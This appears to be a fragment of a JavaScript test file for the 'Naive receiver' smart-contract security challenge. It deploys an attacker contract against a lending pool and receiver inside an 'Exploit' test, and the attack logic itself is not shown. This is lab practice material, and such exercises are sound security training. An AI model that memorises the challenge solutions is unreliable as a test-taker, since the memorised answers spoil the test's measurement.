...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackerFactory = await ethers.getContractFactory('Attacker1', attacker);
        this.attacker = await AttackerFactory.deploy(this.pool.address, this.receiver.address);
